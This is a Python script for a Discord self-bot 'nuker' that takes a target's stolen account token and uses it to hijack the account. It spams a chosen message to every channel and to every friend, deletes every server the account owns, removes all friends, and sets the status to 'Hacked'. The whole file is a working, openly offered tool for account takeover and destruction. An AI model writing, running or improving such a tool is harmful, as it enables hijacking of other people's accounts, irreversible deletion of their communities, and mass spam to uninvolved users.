import discord
from discord.ext import commands
import colorama
from colorama import Fore
import random
import string

intents = discord.Intents.all()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="-", intents=intents, self_bot=True)

token = input(f"{Fore.CYAN}Enter target's token: ")
message = input(f"{Fore.MAGENTA}Enter your message (to be sent everywhere) here: ")

@bot.event
async def on_ready():
    global message
    print(f"""{Fore.RED}
███████     ████████       ████████████   {Fore.CYAN}  ████████████    {Fore.CYAN}    ████████████      {Fore.RED} ██          ██
██    ██       ██          ██               ██                  ██                 ██          ██
██    ██       ██          ██               ██                  ██                 ██          ██
██████       {Fore.RED}  ██          ██      █████    ██      █████     {Fore.RED}  █████████        {Fore.CYAN}  ██████████████
██             ██          ██         ██    ██         ██       ██                 ██          ██
██          ████████       ████████████     ███████████        {Fore.CYAN} ████████████       ██         {Fore.RED} ██\n\nMade by Piggeh#0001""")
    for guild in bot.guilds:
        for channel in guild.channels:
            try:
                await channel.send(message)
                print(f"Sent to {channel}")
            except:
                print(f"{Fore.RED}No permissions to send message in {channel}")
    
    print(f"\n{Fore.YELLOW}Done Sending messages to servers")
    for guild in bot.guilds:
        try:
            await guild.delete()
            print(f"{Fore.GREEN}Deleted: {guild}")
        except:
            print(f"{Fore.RED}No permissions to delete {guild}")
    print(f"{Fore.YELLOW}\nDone deleting servers")

    for friend in bot.user.friends:
        try:
            await friend.send(message)
            print(f"{Fore.GREEN}Sent to {friend}")
        except:
            print(f"{Fore.RED}Couldn't send message to {friend}")

    print(f"\n{Fore.YELLOW}Done sending messages to friends")
    for friend in bot.user.friends:
        try:
            print(f"{Fore.GREEN}Removed {friend} as friend")
            await friend.remove_friend()
        except:
            print(f"{Fore.RED}Couldn't remove {friend}")
    print(f"{Fore.YELLOW}Done removing friends")

    status = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for x in range(0,10))
    await bot.change_presence(activity=discord.Game(name=f"Hacked: {status}"))
    
bot.run(token,bot=False)
